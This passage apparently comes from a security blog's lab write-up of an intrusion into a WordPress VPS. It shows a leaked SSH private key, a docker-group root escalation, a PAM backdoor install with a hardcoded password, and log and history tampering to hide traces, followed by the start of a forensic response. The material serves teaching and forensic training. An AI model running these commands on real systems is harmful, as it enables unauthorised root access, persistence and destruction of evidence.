</span></span><span class=line><span class=cl>aOvZZXNc6JrNZU/TMHKgigpxwt1DKWQ9UvWi3i6X/CpVgjrv3z/2VPhPO4GJU0JX
</span></span><span class=line><span class=cl>Q7NWpYv4s4ULgUhSIKxcnTvof6fxLAu9NxCGiLq6tL5ZG3naN9ITDK9MhFgrKYMH
</span></span><span class=line><span class=cl>/jTsiqdv/CkVhVK3EZHaKgqcJPxhkNInxM1S8mblPUrYQD/9rL8iq1YQyHhRddjU
</span></span><span class=line><span class=cl>zm1BT7j3vE8ukxs7VDeVgYEFS0HTRfyifQMLb+oa/GbMnoi73if9H9gVFMPdO6va
</span></span><span class=line><span class=cl>jyb5KUMB59/gheaFVEF5FWrQH3NNbnSX46SQIwIDAQABAoIBAQCbiBCkOrfC53d2
</span></span><span class=line><span class=cl>oLr8TxXdxJ7Wj6jBWvnX7f370msi7YYGjtgGi15XT0L//E2gfhC2E/zkaDUFJBkh
</span></span><span class=line><span class=cl>hooHgDwczc/V9G+foaTeGl5ZGSl7czhSUd4Z6BlWXbUX/fqjab0nQUPNB6691A5M
</span></span><span class=line><span class=cl>VMrB6PSNn8ccnGOPWso1RJ7K8sxQ+DrG3ry/xVxcq+ciyBeLrZjS4QJeybEjMEcl
</span></span><span class=line><span class=cl>/Dl6bGypH1uI7lo4/gwcmK220260JTCBa4zp3c930cw9ht4DcCcgY67no24BX4zi
</span></span><span class=line><span class=cl>SA7ZSNnOJRAMbNZU4369LxQOBYH66g0ndWLXz3FVNsch5yiMEFtcbW2jAvcCad01
</span></span><span class=line><span class=cl>+clQiBWBAoGBAOxF8Nl5OjZNsp0zRSj/WTxKur6uTQZkxSd2mA98wMhWwn0gdEtj
</span></span><span class=line><span class=cl>C2AIwEni9Lix/r0wIHc96QCScRIcn4X0+D4e9nLbdRWKAKcR3zNncPIcdR6ia8Hp
</span></span><span class=line><span class=cl>hNxowkB6E+nWqs86zq+dJvpuSCK3mi6MZAv42UtzyukPfrTieyKrlrDDAoGBAOci
</span></span><span class=line><span class=cl>nKcTLpLH6U4whb6/qOXJxvPhbcGSY67dswqrZC/iOVimHOEnho+L5zfEHsA1///i
</span></span><span class=line><span class=cl>FrZSnvhDSmzrTx2xGhejzNh7EM2fTNGgtbbTscdAfzUHEkTDpHntW0WomPQ3knLF
</span></span><span class=line><span class=cl>4kRCXQp1zRrTkoWQUrgJnNKEOq95ebFq/MBU7K0hAoGBALOKvmfz2Al153nPgQmT
</span></span><span class=line><span class=cl>aLMJMnk9qGhoYO0JEKoMKc7TJv3AkL7Mp9M1MzGyVjaXg7UuAi26jPmTTnrt50b7
</span></span><span class=line><span class=cl>DTzfeHV1ULaqZK6QRSUhwNEqUNGTqQD0u7JlpN8sJT+3kZrh3DfU2s7IyOYg0Pf4
</span></span><span class=line><span class=cl>VPpIAo90kUejL6yywdFpxJvTAoGASQL39RbsGVWo7xgIx46Hbb7lZ9iH8SOq9Wv2
</span></span><span class=line><span class=cl>yKIHTdDqSISAjucLbIDHEyiShikIqu3iOsmyib3H3swd+8Ub9ue5J5EIZ8uwWm+n
</span></span><span class=line><span class=cl>tw78E3LePAP1017xr8o4kLKHTm3XhwXXSbSk60728Uhv+lzypEv1C9LVLuTyegbP
</span></span><span class=line><span class=cl>vHmXIcECgYAE5+xbrXMXnRsxmQkKc4QB5eMZyvPHkq4CMNLrgwpr3b/MSGtZkwgS
</span></span><span class=line><span class=cl>pNyEYy/Ya2utPWzRFUPUOkDjMi4vYNvbJ8qztKTVRb6Nkj0b5ENLukBJ7fPIoA+R
</span></span><span class=line><span class=cl>Aw2IgvxFUXiq6D6Mw978b594/5tOmlwCR+JKK0pvYDeLLwg4kavcqA<span class=o>==</span>
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><p>Yay! I&rsquo;ll be able to get a real shell!</p><h3 id=its-over>It&rsquo;s over&mldr;</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ chmod <span class=m>600</span> odie_priv.key 
</span></span><span class=line><span class=cl>host $ ssh -i odie_priv.key odie@192.168.122.147
</span></span><span class=line><span class=cl>odie@webserver $ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>odie<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>odie<span class=o>)</span> <span class=nv>groupes</span><span class=o>=</span>1000<span class=o>(</span>odie<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,108<span class=o>(</span>netdev<span class=o>)</span>,999<span class=o>(</span>docker<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Yeeeeeeeees! Here I am with the identity of <strong>Odie</strong> on his system, I will be able to steal all ENSIBS projects! I could stop the attack here&mldr;</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif data-srcset="https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif, https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif 1.5x, https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif title=https://media.giphy.com/media/YTbZzCkRQCEJa/giphy.gif></p><p>&mldr; Or not. In case of real red team operation, you can&rsquo;t surrender before being <strong>root</strong> and remove all traces left behind. And when you&rsquo;re <strong>root</strong> you&rsquo;re able to give a little present: a backdoor :D</p><p>Here, I executed the <code>id</code> command to make sure of my rights. I saw something really nice: the <strong>odie</strong> user is in the <code>docker</code> group. Odie probably made this because he is too lazy to do <code>sudo</code> before doing some docker stuff. But because of this, I&rsquo;m able to get <strong>root</strong> access.</p><p>Indeed, <code>docker</code> daemon is going to access to the <strong>root</strong> user, but also to all users in <code>docker</code> group. In this way, it&rsquo;s possible to get a <strong>root</strong> shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>odie@webserver $ docker images
</span></span><span class=line><span class=cl>REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
</span></span><span class=line><span class=cl>hello-world         latest              4ab4c602aa5e        <span class=m>3</span> months ago        1.84kB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>odie@webserver $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
</span></span><span class=line><span class=cl>Unable to find image <span class=s1>&#39;chrisfosterelli/rootplease:latest&#39;</span> locally
</span></span><span class=line><span class=cl>latest: Pulling from chrisfosterelli/rootplease
</span></span><span class=line><span class=cl>2de59b831a23: Downloading <span class=o>[==========================================</span>&gt;        <span class=o>]</span>  56.22de59b831a23: Pull <span class=nb>complete</span> 
</span></span><span class=line><span class=cl>354c3661655e: Pull <span class=nb>complete</span> 
</span></span><span class=line><span class=cl>91930878a2d7: Pull <span class=nb>complete</span> 
</span></span><span class=line><span class=cl>a3ed95caeb02: Pull <span class=nb>complete</span> 
</span></span><span class=line><span class=cl>489b110c54dc: Pull <span class=nb>complete</span> 
</span></span><span class=line><span class=cl>Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
</span></span><span class=line><span class=cl>Status: Downloaded newer image <span class=k>for</span> chrisfosterelli/rootplease:latest
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>You should now have a root shell on the host OS
</span></span><span class=line><span class=cl>Press Ctrl-D to <span class=nb>exit</span> the docker instance / shell
</span></span><span class=line><span class=cl>root@webserver <span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_17.gif></p><h2 id=post-exploitation>Post exploitation</h2><p>During post-exploitation, it&rsquo;s time for backdooring the system and remove all traces left behind.</p><h3 id=pam-backdoor>PAM backdoor</h3><p>PAM means <code>Pluggable Authentication Modules</code>, in other words, and to be brief, it&rsquo;s the authentication mechanism in modern Linux systems. This mechanism is requested when you&rsquo;re using SSH, sudo or whatever.</p><p>Now, what would happen if we added a condition to the code? Something like: &ldquo;If the password is equal to PlopPlop1337, then log me regardless of the user and the real password&rdquo;. Many blogs got articles about this kind of backdoor, there are even some GitHub to automate the process: <a href=https://github.com/zephrax/linux-pam-backdoor target=_blank rel="noopener noreffer">https://github.com/zephrax/linux-pam-backdoor</a></p><p>First things to do, determine the PAM version used by the target system:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@webserver $ dpkg -l <span class=p>|</span> grep pam 
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>ii  libpam-modules:amd64          1.1.8-3.6                      amd64        Pluggable Authentication Modules <span class=k>for</span> PAM
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@webserver $ wget https://github.com/zephrax/linux-pam-backdoor/archive/master.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@webserver $ unzip master.zip 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@webserver $ ./linux-pam-backdoor-master/backdoor.sh -v 1.1.8 -p PlopPlop1337
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@webserver $ mv /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@webserver $ mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
</span></span></code></pre></td></tr></table></div></div><p>The first <code>mv</code> is used to do a backup of the existing libary, in case of failure. It&rsquo;s simple, if I fail my backdoor installation, I will simply broke the authentication system.</p><p>Ok, the backdoor is installed, let&rsquo;s test:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_18.gif></p><p>In two password prompt above, the password was: <code>PlopPlop1337</code>. The system is fully compromised, with perennial access to the system!</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif data-srcset="https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif, https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif 1.5x, https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif title=https://media.giphy.com/media/LwBqgdCi3nenTBU4wU/giphy.gif></p><h3 id=cleaning-time>Cleaning time</h3><p>Ok, the backdoor is in place and well hidden. Now it&rsquo;s time to clean our mess. Here some elements to remove:</p><ul><li>Apache2 logs</li><li>MySQL logs</li><li>Authentication logs</li><li>PHP arbitrary code in the WordPress</li><li><strong>odie</strong> and <strong>root</strong> history</li></ul><p>I probably forget things to remove. Some are well known, but others not at all. I must have really forgot things :')</p><h4 id=apache-logs>Apache logs</h4><p>The <code>access.log</code> file contains Apache2 server logs, each page requested, http method and so on are stored in this file.</p><p>I just have to find when I started to play with my arbitrary code in the WordPress theme:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backdoor $ cat access.log <span class=p>|</span> less -N 
</span></span><span class=line><span class=cl><span class=o>[</span>Research on <span class=s2>&#34;x=&#34;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>    <span class=m>666</span> zer.php<span class=p>&amp;</span><span class=nv>theme</span><span class=o>=</span>rock-band<span class=s2>&#34; &#34;</span>Mozilla/5.0 <span class=o>(</span>X11<span class=p>;</span> Linux x86_64<span class=p>;</span> rv:64.0<span class=o>)</span> Gecko/20100101 Firefox/64.0<span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    667 192.168.122.1 - - [27/Dec/2018:00:35:10 +0100] &#34;</span>GET /wp-content/themes/rock-band/inc/customizer.php HTTP/1.1<span class=s2>&#34; 500 185 &#34;</span>-<span class=s2>&#34; &#34;</span>Mozilla/5.0 <span class=o>(</span>X11<span class=p>;</span> Linux x86_64<span class=p>;</span> rv:64.0<span class=o>)</span> 
</span></span><span class=line><span class=cl>    <span class=m>667</span> Gecko/20100101 Firefox/64.0<span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    668 192.168.122.1 - - [27/Dec/2018:00:35:15 +0100] &#34;</span>GET /wp-content/themes/rock-band/inc/customizer.php?x<span class=o>=</span>ls HTTP/1.1<span class=s2>&#34; 500 185 &#34;</span>-<span class=s2>&#34; &#34;</span>Mozilla/5.0 <span class=o>(</span>X11<span class=p>;</span> Linux x86_64<span class=p>;</span> rv:6    <span class=m>668</span> 4.0<span class=o>)</span> Gecko/20100101 Firefox/64.0<span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    669 192.168.122.147 - - [27/Dec/2018:00:35:21 +0100] &#34;</span>GET /wp-admin/theme-editor.php?theme<span class=o>=</span>rock-band<span class=p>&amp;</span><span class=nv>file</span><span class=o>=</span>inc%2Fcustomizer.php<span class=p>&amp;</span><span class=nv>wp_scrape_key</span><span class=o>=</span>370c7cd663254ecfd57bd42d35e    <span class=m>669</span> 318a7<span class=p>&amp;</span><span class=nv>wp_scrape_nonce</span><span class=o>=</span><span class=m>1674105339</span> HTTP/1.1<span class=s2>&#34; 200 12023 &#34;</span>-<span class=s2>&#34; &#34;</span>WordPress/5.0.2<span class=p>;</span> http://192.168.122.147<span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>backdoor </span>$<span class=s2> cat access.log | head -n 666 &gt; access.log.bak 
</span></span></span><span class=line><span class=cl><span class=s2>backdoor </span>$<span class=s2> mv access.log.bak access.log 
</span></span></span></code></pre></td></tr></table></div></div><p>Moreover, we&rsquo;re speaking about Iron Maiden since the beginning, 666 is a good number!</p><h4 id=mysql-logs>MySQL logs</h4><p>In <code>/var/log/mysql/</code> folder there is only one file: <code>error.log</code>. It does not contains that much relevant for a forensic analyst. However, there are <code>.mysql_history</code> file in each users folders: <code>/root</code> and <code>/home/odie</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backdoor <span class=c1># cat /home/odie/.mysql_history</span>
</span></span><span class=line><span class=cl><span class=o>[</span>legit data<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>backdoor <span class=c1># cat /root/.mysql_history</span>
</span></span><span class=line><span class=cl><span class=o>[</span>legit data<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s better not to remove everything. Even if Odie is not looking at his logs, let&rsquo;s try to delete only necessary stuff.</p><h4 id=authentication-logs>Authentication logs</h4><p>The <code>/var/log/auth.log</code> file contains authentication logs, we talked about PAM mechanism earlier. I will take a look inside to know when <strong>www-data</strong> started to execute Linux commands:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat /var/log/auth.log <span class=p>|</span> less -N
</span></span><span class=line><span class=cl><span class=o>[</span>Looking <span class=k>for</span> <span class=s2>&#34;www-data&#34;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>     <span class=m>88</span> Dec <span class=m>26</span> 20:39:01 webserver CRON<span class=o>[</span>12209<span class=o>]</span>: pam_unix<span class=o>(</span>cron:session<span class=o>)</span>: session closed <span class=k>for</span> user root
</span></span><span class=line><span class=cl>     <span class=m>89</span> Dec <span class=m>26</span> 20:41:26 webserver sudo:     odie : <span class=nv>TTY</span><span class=o>=</span>pts/0 <span class=p>;</span> <span class=nv>PWD</span><span class=o>=</span>/var/www/html <span class=p>;</span> <span class=nv>USER</span><span class=o>=</span>root <span class=p>;</span> <span class=nv>COMMAND</span><span class=o>=</span>/bin/chown -R www-data:www-data /var/www/html
</span></span><span class=line><span class=cl>     <span class=m>90</span> Dec <span class=m>26</span> 20:41:26 webserver sudo: pam_unix<span class=o>(</span>sudo:session<span class=o>)</span>: session opened <span class=k>for</span> user root by odie<span class=o>(</span><span class=nv>uid</span><span class=o>=</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /var/log/auth.log <span class=p>|</span> head -n <span class=m>88</span> &gt; /var/log/auth.log.bak 
</span></span><span class=line><span class=cl>$ mv /var/log/auth.log.bak /var/log/auth.log
</span></span></code></pre></td></tr></table></div></div><h4 id=php-backdoor>PHP backdoor</h4><p>Remember the cute little line in the WordPress theme? Well, it&rsquo;s time to take it off. However, to avoid generating other apache logs, we will not go through the web interface, but through our favorite command line text editor.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backdoor <span class=c1># vim /var/www/html/wp-content/themes/rock-band/inc/customizer.php</span>
</span></span><span class=line><span class=cl><span class=o>[</span>Backdoor removing<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=users-history>Users history</h4><p>I logged in with a lot of users during this operation:</p><ul><li>www-data</li><li>odie</li><li>root</li></ul><p><code>.bash_history</code> files got polluted. Let&rsquo;s start with <strong>odie</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backdoor <span class=c1># cat /home/odie/.bash_history | less -N</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl> 	<span class=m>156</span> <span class=nb>cd</span> /var/www/html
</span></span><span class=line><span class=cl>    <span class=m>157</span> sudo mysqldump wp_db &gt; database_name.sql
</span></span><span class=line><span class=cl>    <span class=m>158</span> sudo su
</span></span><span class=line><span class=cl>    <span class=m>159</span> docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>backdoor <span class=c1># cat /home/odie/.bash_history | head -n 158 &gt; /home/odie/.bash_history.bak</span>
</span></span><span class=line><span class=cl>backdoor <span class=c1># mv /home/odie/.bash_history.bak /home/odie/.bash_history</span>
</span></span></code></pre></td></tr></table></div></div><p>Same operation with <strong>root</strong> user:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>backdoor <span class=c1># cat /root/.bash_history | less -N     </span>
</span></span><span class=line><span class=cl>	<span class=m>23</span> mysqldump wp_db &gt; database_name.sql
</span></span><span class=line><span class=cl>    <span class=m>24</span> md5sum database_name.sql 
</span></span><span class=line><span class=cl>    <span class=m>25</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>    <span class=m>26</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>    <span class=m>27</span> dpkg -l <span class=p>|</span> grep pam 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>backdoor <span class=c1># cat /root/.bash_history | head -n 26 &gt; /root/.bash_history.bak </span>
</span></span><span class=line><span class=cl>backdoor <span class=c1># mv /root/.bash_history.bak /root/.bash_history</span>
</span></span></code></pre></td></tr></table></div></div><p>Like KFC, it&rsquo;s all good. Traces are erased and we kept our backdoor in place.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif data-srcset="https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif, https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif 1.5x, https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif title=https://media.giphy.com/media/8fen5LSZcHQ5O/giphy.gif></p><h1 id=blue-team-time>Blue team time</h1><p>Odie, taken in his studies, didn&rsquo;t notice anything on his fanboy site. Several days goes, and the hacker connects to the VPS sometimes. To steal all ENSIBS courses.</p><p>One day, this silly hacker did a mistake: he forgot to log off. By chance, Odie did a <code>ss</code> and sees an unusual connection:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>real_odie $ ss <span class=p>|</span> grep tcp
</span></span><span class=line><span class=cl>tcp   ESTAB      <span class=m>0</span>      <span class=m>0</span>      192.168.122.216:ssh                  192.168.122.158:36736                
</span></span><span class=line><span class=cl>tcp   ESTAB      <span class=m>0</span>      <span class=m>0</span>      192.168.122.216:ssh                  192.168.122.1:39178
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_1.gif></p><p>Panicked by what he sees, he decides to make a memory dump of his VPS and put on his cyber digital firefighter cap 2.0.</p><h2 id=forensic-environment>Forensic environment</h2><p>In order to analyze this case in the best possible conditions, it&rsquo;s necessary to extract the memory from the server and creating the appropriate volatility profile.</p><h3 id=disk-extraction>Disk extraction</h3><p>To avoid further corrupting this infected disk, I will make a bit-by-bit copy of it with <code>dd</code> to be able to analyze it safely. For space and portability reasons, I will compress it on the fly:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>real_odie $ lsblk
</span></span><span class=line><span class=cl>NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
</span></span><span class=line><span class=cl>sr0     11:0    <span class=m>1</span> 1024M  <span class=m>0</span> rom  
</span></span><span class=line><span class=cl>vda    254:0    <span class=m>0</span>   12G  <span class=m>0</span> disk 
</span></span><span class=line><span class=cl>vda1 254:1    <span class=m>0</span>   10G  <span class=m>0</span> part /
</span></span><span class=line><span class=cl>vda2 254:2    <span class=m>0</span>    1K  <span class=m>0</span> part 
</span></span><span class=line><span class=cl>vda5 254:5    <span class=m>0</span>    2G  <span class=m>0</span> part <span class=o>[</span>SWAP<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real_odie $ sudo bash -c <span class=s2>&#34;dd if=/dev/vda1 bs=4M status=progress | gzip &gt; /mnt/vda1_dmp_2019_01.gz&#34;</span>
</span></span><span class=line><span class=cl><span class=m>10607394816</span> bytes <span class=o>(</span><span class=m>11</span> GB, 9,9 GiB<span class=o>)</span> copied, 167,002 s, 63,5 MB/s 
</span></span><span class=line><span class=cl>2560+0 enregistrements lus
</span></span><span class=line><span class=cl>2560+0 enregistrements crits
</span></span><span class=line><span class=cl><span class=m>10737418240</span> bytes <span class=o>(</span><span class=m>11</span> GB, <span class=m>10</span> GiB<span class=o>)</span> copied, 167,876 s, 64,0 MB/s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real_odie $ md5sum vda1_dmp_2019_01.gz       
</span></span><span class=line><span class=cl>43b967640cc102f05fb2b371516468fa  vda1_dmp_2019_01.gz
</span></span></code></pre></td></tr></table></div></div><p>You can download the dump here: <a href=https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g target=_blank rel="noopener noreffer">https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g</a></p><table><thead><tr><th>Fichier</th><th>MD5</th><th>Lien</th></tr></thead><tbody><tr><td>vda1_dmp_2019_01.gz</td><td>43b967640cc102f05fb2b371516468fa</td><td><a href=https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g target=_blank rel="noopener noreffer">https://mega.nz/#!7OgBSCxQ!LVvuyZBfl4aFXAk5VsKs_y-RwmhM8KZeqNhOfBEuu6g</a></td></tr></tbody></table><h3 id=timeline>Timeline</h3><h3 id=memory-extraction>Memory extraction</h3><p>To extract the memory from the server, I will use LiME: Linux Memory Extractor.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>real_odie $ git clone https://github.com/504ensicsLabs/LiME
